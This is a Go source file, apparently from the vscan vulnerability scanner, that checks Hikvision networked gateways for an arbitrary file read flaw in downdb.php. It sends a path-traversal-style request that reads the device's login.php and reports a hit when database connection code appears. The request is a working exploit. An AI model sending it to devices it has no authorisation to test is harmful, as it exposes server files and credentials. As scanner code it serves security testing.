package HIKVISION

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//HIKVISION 联网网关 downdb.php 任意文件读取漏洞

func Downdb(u string) bool {
	if req, err := pkg.HttpRequset(u+"/localDomain/downdb.php?fileName=web/html/data/login.php", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "/common/connDb.php") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln HIKVISION HIKVISION 联网网关 downdb.php 任意文件读取漏洞 |%s\n", u+"/localDomain/downdb.php?fileName=web/html/data/login.php"))
			return true
		}
	}
	return false
}
